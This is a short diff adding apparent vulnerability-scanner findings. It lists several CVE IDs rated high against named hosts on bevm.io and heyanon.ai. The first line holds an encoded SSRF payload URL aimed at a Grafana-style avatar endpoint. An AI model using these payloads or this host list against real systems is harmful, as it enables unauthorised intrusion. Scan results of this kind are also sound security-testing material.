@@ -1,0 +1,5 @@
+[CVE-2020-13379] [http] [high] https://70f70b14-043c-4b77-a108-441f8b9f30b5d-lnd-monitor.bevm.io/avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1
+[CVE-2021-27358] [http] [high] https://70f70b14-043c-4b77-a108-441f8b9f30b5d-lnd-monitor.bevm.io/api/snapshots
+[CVE-2021-39226] [http] [high] https://70f70b14-043c-4b77-a108-441f8b9f30b5d-lnd-monitor.bevm.io/api/snapshots/:key
+[CVE-2025-55184] [http] [high] https://web-ui.extension.prod.heyanon.ai
+[CVE-2025-55184] [http] [high] https://web-ui2.extension.dev.heyanon.ai
